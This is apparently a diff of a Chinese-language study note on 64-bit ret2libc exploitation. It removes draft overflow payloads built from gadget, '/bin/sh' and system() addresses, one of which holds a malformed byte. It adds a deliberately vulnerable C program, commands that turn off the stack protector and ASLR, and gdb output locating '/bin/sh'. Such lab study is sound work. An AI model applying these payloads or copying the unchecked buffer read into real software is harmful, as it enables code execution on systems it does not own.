@@ -261,30 +261,53 @@ Stopped reason: SIGSEGV
 
 ```
 
-现在的问题,`strcpy(buf,argv[1])`面临00截断
+现在的问题是binary中的`pop rdi ; ret`地址为`0x00000000004006c3`,`strcpy(buf,argv[1])`没有把\x00放进去,只能换个代码演示...
+
+```c
+/* Compile: gcc -fno-stack-protector ret2libc.c -o ret2libc      */
+/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space     */
+
+#include <stdio.h>
+#include <unistd.h>
+
+int vuln() {
+    char buf[80];
+    int r;
+    r = read(0, buf, 400);
+    printf("\nRead %d bytes. buf is %s\n", r, buf);
+    puts("No shell for you :(");
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    printf("Try to exec /bin/sh");
+    vuln();
+    return 0;
+}
+```
+
+编译
+
+```shell
+gcc -fno-stack-protector ret2libc.c -o ret2libc
+echo 0 > /proc/sys/kernel/randomize_va_space
+chmod +x ret2libc
+```
+
+相同的方法查找到libc基地址`7ffff7a0d000`,`pop rdi ; ret`地址为`0x00000000004006a3`
+
+ps:可以使用如下方法查找字符串
 
 ```
-0x43270 system		7FFF F7A5 0270
-
-libc 0x7ffff7a0d000
-
-sh 11e5e		7FFF F7A1 EE5E
-
-0x00000000004006c3 : pop rdi ; ret
-
-\xc3\x06\x40\x00\x00\x00\x00\x00
-
-\x5e\xee\xa1\xf7\xff\x7f\x00
-\x70\x0x\xa5\xf7\xff\x7f\x00
-
-r `python -c 'print "A"*270'`
-
-r `python -c 'print "A"*264+"\x43\x43\x43\x43\x43\x43\x00\x00"'`
-
-r `python -c 'print "A"*264+"\xc3\x06\x40\x00\x00\x00\x00\x00"'`
-
-r `python -c 'print "A"*264+"\xc3\x06\x40\x00\x00\x00\x00\x00"+"\x5e\xee\xa1\xf7\xff\x7f\x00\x00"+"\x70\x0x\xa5\xf7\xff\x7f\x00\x00"'`
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 3 results, display max 3 items:
+ret2libc : 0x40070b --> 0x68732f6e69622f ('/bin/sh')
+ret2libc : 0x60070b --> 0x68732f6e69622f ('/bin/sh')
+    libc : 0x7ffff7b94cc9 --> 0x68732f6e69622f ('/bin/sh')
 
 ```
 
-https://blog.techorganic.com/
+竟然卡住了
+
+https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
